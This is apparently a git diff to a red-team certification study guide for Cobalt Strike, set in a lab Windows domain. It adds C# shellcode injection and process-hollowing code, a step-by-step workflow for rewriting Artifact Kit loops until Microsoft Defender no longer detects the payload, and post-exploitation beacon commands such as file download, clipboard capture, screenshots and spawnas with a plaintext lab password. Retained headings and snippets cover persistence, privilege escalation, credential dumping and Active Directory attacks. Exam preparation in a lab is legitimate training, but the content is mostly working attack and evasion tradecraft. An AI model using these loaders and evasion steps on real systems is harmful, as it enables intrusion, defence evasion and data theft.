@@ -32,6 +32,127 @@ TCP-local:      Port 1337 (for SQL/isolated segments)
 
 ---
 
+## Phase 0a — Malware Development Essentials (Background — Pre-Exam Knowledge)
+
+> **Course position:** Taught before Defence Evasion. Not a standalone lab — understand this to know *why* the Initial Access payloads work. Process hollowing is what `ngentask.exe` does internally.
+
+Three-step shellcode execution progression (each step adds stealth):
+
+### Step 1 — Local Execution (own process)
+```csharp
+// Simplest — beacon runs inside your own injector process (obvious parent, easy to kill)
+byte[] buf = new byte[] { /* shellcode bytes */ };
+IntPtr ptr  = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);  // RWX
+Marshal.Copy(buf, 0, ptr, buf.Length);
+CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
+```
+
+### Step 2 — Remote Process Injection (existing process)
+```csharp
+// Inject into a running process — beacon parent = chosen PID (better blend)
+IntPtr hProc = OpenProcess(0x001F0FFF, false, targetPid);
+IntPtr mem   = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+WriteProcessMemory(hProc, mem, buf, (uint)buf.Length, out _);
+CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+```
+
+### Step 3 — Process Hollowing (new suspended process) — used in Initial Access
+```csharp
+// Spawn a legitimate process suspended, overwrite its entry point, resume it
+// Beacon parent = legitimate signed process (msedge.exe, ngentask.exe)
+CreateProcessA(
+    null,                    // lpApplicationName
+    "C:\\Windows\\System32\\svchost.exe",
+    null, null, false,
+    CREATE_SUSPENDED,        // 0x4 — process won't execute until ResumeThread
+    null, null,
+    ref si, out pi
+);
+NtQueryInformationProcess(pi.hProcess, 0, ref pbi, ...);  // find PEB address
+ReadProcessMemory(pi.hProcess, imageBaseAddr, ...);       // read PE headers → entry point
+WriteProcessMemory(pi.hProcess, entryPoint, shellcode, ...);  // overwrite entry point
+ResumeThread(pi.hThread);  // resume → jumps straight into shellcode
+```
+
+> **Why it matters for the exam:** The `ngentask.exe` Initial Access technique uses this principle — a legitimate .NET host loads your `AppDomainHijack.dll`, which allocates and executes beacon shellcode inside a suspended `msedge.exe`. The exam payload is pre-built; knowing this lets you adapt if it fails.
+
+**OPSEC note:** Step 3 is `OPSEC-CAUTION` — `CreateProcess(CREATE_SUSPENDED)` + `WriteProcessMemory` + `ResumeThread` in sequence is a known hollowing signature. Defender's memory scanner catches the shellcode if `stage.userwx true`. Mitigated by Artifact Kit + `userwx false`.
+
+---
+
+## Phase 0b — Antivirus Evasion: ThreatCheck → Ghidra Iteration Cycle
+
+> **Course position:** Taught alongside/after Malware Essentials, feeds directly into the Artifact Kit build cycle in Phase 1. The iteration loop here IS the exam-day workflow for making artifacts clean.
+
+### Why the Artifact Kit default isn't clean
+Cobalt Strike ships Artifact Kit with a simple XOR-decryption `for` loop in `patch.c`. Defender has that exact bytecode sequence flagged. ThreatCheck locates the offset; Ghidra shows you what bytecode Defender is matching; you change the loop structure; rebuild; repeat.
+
+### ThreatCheck → Ghidra Iteration Workflow
+
+**Step 1 — Run ThreatCheck, get the flagged offset:**
+```cmd
+ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
+# Output: Byte[]: 0x00004C20
+#         HEX: 31 C0 48 FF C8 ...
+```
+
+**Step 2 — Import artifact into Ghidra:**
+```
+ghidraRun.bat
+→ New Project → Import File → artifact64big.exe
+→ Double-click to open → Auto Analyse (accept all defaults)
+```
+
+**Step 3 — Navigate to flagged offset:**
+```
+Window → Go To
+Enter: 0x4C20        ← hex offset from ThreatCheck output (prefix with 0x)
+```
+Ghidra highlights the disassembly at that address. The right panel shows decompiled C.
+
+**Step 4 — Identify the flagged construct:**
+Look for a `for` loop pattern in the decompiled view:
+```c
+// Signatured pattern Defender flags:
+for ( int x = 0; x < length; x++ ) {
+    buffer[x] = buffer[x] ^ key[x % 8];
+}
+```
+This corresponds to `patch.c` lines ~45 (svc payload) and ~116 (exe payload).
+
+**Step 5 — Map to patch.c and change loop direction:**
+```
+VSCode: File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
+Open: src-common\patch.c
+```
+Replace both for-loops with backward while-loops (different compiled bytecode → different bytes on disk):
+```c
+// BEFORE (signatured):
+for ( int x = 0; x < length; x++ ) { ... }
+
+// AFTER (different bytecode — Defender's signature no longer matches):
+int x = length;
+while ( x-- ) {
+    *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
+}
+```
+
+**Step 6 — Rebuild and recheck:**
+```bash
+cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
+./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
+```
+```cmd
+ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
+# No output = CLEAN. New offset output = new signature found → repeat from Step 1.
+```
+
+**Repeat until clean.** Each iteration addresses one signature. Typical: 2–3 iterations.
+
+> **Exam note:** Once clean, load `artifact.cna`. Do not rebuild on exam day unless Defender starts catching your payloads mid-engagement — rebuilding invalidates all existing listeners.
+
+---
+
 ## Phase 1 — Defence Evasion: Malleable C2 & Artifact/Resource Kit
 
 Bypass Defender at every layer before generating any payload.
@@ -123,7 +244,7 @@ beacon> process_browser // GUI tab — confirm beacon is inside msedge.exe, chec
 
 ---
 
-## Phase 4 — Persistence (User-Level — no admin required)
+## Phase 4 — Persistence (User-Level — no admin)
 
 Deploy immediately after first beacon. Do this before privesc or lateral movement.
 Technique: COM hijack via Microsoft Teams (`HKCU` — no admin, beacon inside `ms-teams.exe`).
@@ -146,14 +267,62 @@ Teams restart triggers DLL load → new beacon from `ms-teams.exe`.
 
 ---
 
-## Phase 5 — Privilege Escalation
+## Phase 5 — Post Exploitation  
+
+Hunt down the operational objective. Red team locate the objective, figure out who has access to it, and execute a attack chain to gain access, without getting caught.  
+
+```cs
+// session passing
+beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local
+
+//file system
+beacon> file_browser
+
+//downloading files
+beacon> download C:\Users\pchilds\Desktop\flag.txt
+// Sync Files > save the file to attacker host
+
+// Processes
+beacon> process_browser
+
+// clipboard
+beacon> clipboard
+
+// registry
+beacon> reg query x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+beacon> reg queryv x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
+
+// Screenshots
+beacon> printscreen
+
+// vnc desktop
+beacon> desktop
+
+// Execution Commands
+beacon> shell whoami /user
+
+// Executing Custom Tools
+beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+beacon> powerpick $env:computername
+beacon> powerpick Get-Domain
+
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe AntiVirus
+
+beacon> inline-execute [/path/to/file.o] [args]
+```
+
+---
+
+## Phase 6 — Privilege Escalation
 
 Exploit weak service registry permissions → SYSTEM beacon.
 
 ```cs
 // Enumerate services where low-priv users have FullControl (OPSEC-SAFE — powerpick)
+
 beacon> powerpick $lowpriv = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject]@{ServiceName=$_.PSChildName; Identity=$ace.IdentityReference.Value; Rights=$ace.RegistryRights}}}}
-// Returns: BadWindowsService
+
+// Returns Controlable Windows Service
 
 // Set spawnto for service payload before generating
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
@@ -175,7 +344,7 @@ beacon> sc_start BadWindowsService
 
 ---
 
-## Phase 6 — Elevated Persistence (SYSTEM-Level — requires elevated beacon)
+## Phase 7 — Elevated Persistence (SYSTEM-Level — requires elevated beacon)
 
 WMI event subscription triggers on GPO refresh — survives reboots, no user interaction.
 
@@ -201,7 +370,7 @@ beacon> psinject [BEACON PID] x64 Remove-WmiPersistence
 
 ---
 
-## Phase 7 — Credential Access
+## Phase 8 — Credential Access
 
 Target: dump credentials without touching LSASS directly. Prefer Rubeus/BOF over Mimikatz.
 
@@ -232,7 +401,7 @@ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt    # AS-REP
 
 ---
 
-## Phase 8 — User Impersonation
+## Phase 9 — User Impersonation
 
 Impersonate a user via their Kerberos TGT without knowing their password.
 
@@ -266,7 +435,7 @@ beacon> steal_token <pid>                             // OPSEC-SAFE — in-proce
 
 ---
 
-## Phase 9 — Discovery (OPSEC-SAFE LDAP via BOF)
+## Phase 10 — Discovery (OPSEC-SAFE LDAP via BOF)
 
 All `ldapsearch` commands run as BOFs — no child process, no disk write.
 
@@ -290,7 +459,7 @@ MATCH p=shortestPath((u:User)-[*1..]->(c:Computer{name:"LON-DC-1.CONTOSO.COM"}))
 
 ---
 
-## Phase 10 — Lateral Movement
+## Phase 11 — Lateral Movement
 
 Use highest-OPSEC method that works. Impersonate before moving.
 
@@ -324,7 +493,7 @@ beacon> rev2self     // drop impersonation after lateral move succeeds
 
 ---
 
-## Phase 11 — SOCKS Pivoting
+## Phase 12 — SOCKS Pivoting Tunnel
 
 Tunnel attacker-desktop tools through a beacon into isolated network segments.
 
@@ -354,7 +523,7 @@ Get-ADUser -Filter * -Server lon-dc-1                    # enumerate via SOCKS
 
 ---
 
-## Phase 12 — Kerberos Attacks
+## Phase 13 — Kerberos Attacks
 
 ### Kerberoasting / AS-REP Roasting → see Phase 7
 
@@ -412,7 +581,7 @@ beacon> krb_s4u /ticket:[TGT] /service:host/<target> /impersonateuser:Administra
 
 ---
 
-## Phase 13 — SQL Servers
+## Phase 14 — SQL Servers
 
 ```cs
 // Load SQL-BOF: Cobalt Strike > Script Manager > Load > C:\Tools\SQL-BOF\SQL\SQL.cna
@@ -456,7 +625,7 @@ beacon> sql-disablerpc lon-db-1 lon-db-2
 
 ---
 
-## Phase 14 — ADCS Attacks
+## Phase 15 — ADCS Attacks
 
 ### ESC1 — Misconfigured Client Authentication Template
 
@@ -501,7 +670,7 @@ beacon> powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inb
 
 ---
 
-## Phase 15 — Domain Trusts (Parent-Child)
+## Phase 16 — Domain Trusts (Parent-Child)
 
 Hop from child domain (DUBLIN) to parent domain (CONTOSO) via SID history injection.
 
@@ -530,7 +699,7 @@ beacon> ls \\lon-dc-1\c$
 
 ---
 
-## Phase 16 — Forest Trusts
+## Phase 17 — Forest Trusts
 
 ### Inbound Trust (we are trusted — our users can access foreign domain resources)
 
